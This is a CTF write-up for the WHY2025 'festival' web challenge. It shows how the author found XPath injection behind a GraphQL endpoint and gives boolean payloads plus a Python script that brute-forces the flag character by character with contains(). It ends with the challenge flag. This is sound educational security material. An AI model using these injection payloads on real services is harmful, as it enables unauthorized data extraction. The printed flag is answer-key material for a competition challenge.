# Web/festival
## Description

Every 4 years a Dutch hacker convention is organized. WHY2025 will be the 10th edition, an overview of the previous versions can be found on this page.
(there were no attachments it was a black box challenge)

## Challenge Overview
I was not able to solve this challenge during the CTF but I thought it was a great challenge so I could probably try to write a writeup for this challenge.OK so we were given a single page website 
and there was nothing no extra links or register/login so then I checked the network tab in which I saw GraphQL was being used to get the all the data for the site so I really though that it would be a classic 
GraphQL challenge where we probably had to find hidden queries and abuse arguments to dump the flag but I was not able to find anything with that,I dumped the whole schema 
`{"data":{"__schema":{"types":[{"name":"XMLQuery"},{"name":"Festival"},{"name":"String"},{"name":"FestivalFilter"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"Boolean"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}`
and like checked all the fields everything and couldn't find anything except the fact that root query name of the GraphQL was `XMLQuery` which was quite unusual (as usually the root query name is Query only) 
and it was suggesting something related to XML was involved here.

Then I was trying to cause an error or something that could reveal something and when I tried something like this 

```json
{
  "query": "{ festival(filter: {id: \"1'\"}) { abbreviation name description year } }"
}
```
which resulted din this error 

```json
{"errors":[{"message":"Invalid predicate","locations":[{"line":1,"column":3}],"path":["festival"]}],"data":{"festival":null}}
```
It does look like a usual GraphQL error but when you search this on google you would find this 
[StackOverflow](https://stackoverflow.com/questions/58069538/getting-error-invalid-predicate-in-lxml-when-using-xpath)

Which tell us that XPath query language being used to retrieve data from an XML document and honestly I never came across this so searched about it and found that we could try XPath
injection which is kinda similar to SQLi and then I found this blog which kinda explains everything about [XPath injection](https://www.vaadata.com/blog/xpath-injections-exploitations-and-security-tips/)

for verifying I tried this 
```json
{
  "query": "{ festival(filter: {id: \"1' and '1'='1\"}) { abbreviation name description year } }"
}
```
and in this I didn't get any error and got the response for id 1 which confirms that XPath injection is possible.

## Exploit 

After knowing that we have to do XPath inejction, we have to think in which node or like how can we search for the flag in the XML documnet, The first thing that you would try is to check if there's node named 
flag which I tried but no there wasn't then I looked all the operators that are there and then I found a operator `contains()` which helps in Character string search so we could brute-force the whole flag as 
we know the flag formt is something like `flag{md5}` so I checked this with something like  
```json
{
  "query": "query { festival(filter: {id: \"1' and contains(//*,'flag{') and '1'='1\"}) { abbreviation } }"
}

```

And in this we got the abbreviation of id1 so yea this worked now we have to make a script and get the flag char by char using flag format so here is the the script that can get you the flag but yeah it 
would take 3-4 minutes 
```python
import requests
import string
                                                           
URL = "https://festivals.ctf.zone/graphql"

CHARSET = "0123456789abcdef}"
flag = "flag{"

while not flag.endswith("}"):
    found_char = False

    for ch in CHARSET:
        injection = f"1' and contains(//*, '{flag + ch}') and 'a'='a"

        query = {
            "query": f'query {{ festival(filter: {{id: "{injection}"}}) {{ abbreviation }} }}'
        }

        response = requests.post(URL, json=query)
        data = response.json()

        if "festival" in data.get("data", {}) and data["data"]["festival"]:
            flag += ch
            print(f"[+] Found so far: {flag}")
            found_char = True
            break

    if not found_char:
        print("[!] No more characters found. Stopping.")
        break

print(f"[+] Final flag: {flag}")

```
And here's the flag `flag{6bb7325ab7e9e15cdfe30c0ccee79216}`
